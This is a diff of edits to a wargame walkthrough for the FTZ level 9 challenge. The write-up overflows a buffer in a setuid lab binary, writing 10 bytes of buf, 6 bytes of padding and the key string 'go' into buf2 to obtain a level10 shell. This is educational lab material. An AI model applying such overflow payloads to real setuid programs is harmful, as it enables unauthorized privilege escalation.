@@ -37,7 +37,7 @@ main(){
 [level9@ftz tmp]$ ls -l /usr/bin/bof
 -rws--x---    1 level10  level9      12111  8¿ù 19  2014 /usr/bin/bof
 ```
-you cannot debug cuz level9 have only execute permission.
+you cannot debug bof file cuz level9 has only execute permission.
 
 so, you need to make your another file and complie and debug
 ```
@@ -73,11 +73,11 @@ main(){
 It can be overflow : AAAA
 &buf=0xbffff150, &buf2=0xbffff160, distance=0x00000010 / 16 byte
 ```
-The distance buf and buf2 is 16byte, and dummy stack between buf and buf2 is 6byte.
+The distance buf and buf2 is 16byte, and the dummy stack between buf and buf2 is 6byte.
 
-So, you need to input buf(10byte) and dummy(6byte) and the key string("go")
+So, you need to input buf(10byte) and dummy(6byte) and the key string("go") in buf2 that you can get 'bash'
 
-I will input "AAAAAAAAAABBBBBBgo"
+I will input "AAAAAAAAAABBBBBBgo" (A:10byte+B:6byte+go)
 
 ```
 [level9@ftz tmp]$ gdb bof
